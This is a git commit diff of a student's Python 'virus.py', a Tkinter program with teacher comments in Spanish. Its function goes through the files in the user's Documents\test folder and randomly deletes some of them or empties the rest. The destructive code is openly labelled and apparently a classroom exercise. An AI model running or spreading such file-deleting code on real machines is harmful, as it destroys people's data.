a2bf8f568c66b1e90d4e10da350c4daa1621ad3f
Ana-xulian-magarinos <145715715+Ana-xulian-magarinos@users.noreply.github.com>
2023-10-27 00:00:49 +0200

    Update virus.py

--- virus.py
+++ virus.py
@@ -3,21 +3,25 @@ from tkinter import *
 from tkinter import  filedialog as FileDialog
 from os import remove
 import os
-import random
+from random import randint
 
 root=Tk()
 root.title("Ventanas emergentes")
 root.geometry("500x350")
 root.config(bg="gray")
 def ventana():
-    path = ""#cuidado
-    for file in os.listdir(path):
-        if os.path.isfile(os.path.join(path, file)):
-            if random>1:#lo borra
+    #Comentario profe: calcula el path en windows
+    #tpath=os.environ["USERPROFILE"] +"\Documents\\test"
+    #Comentario profe: calcula el mismo path pero más genérico
+    tpath = os.path.expanduser("~") +"\Documents\\test"
+    #Comentario de la profe: Estás borrando o limpiando TODOS los ficheros del direcotrio (¿Es lo que querías hacer?)
+    for file in os.listdir(tpath):
+        if os.path.isfile(os.path.join(tpath, file)):
+            #Comentario profe: necesitas acotar la función random
+            if randint(0,2)>1:#lo borra
                 remove(file)
             else:#crea una copia vacia
-                with  open(file,'w') as file:
-                    file.write()
+               open(os.path.join(tpath, file),'w').close()
                    
 parar=False
 while parar==False:
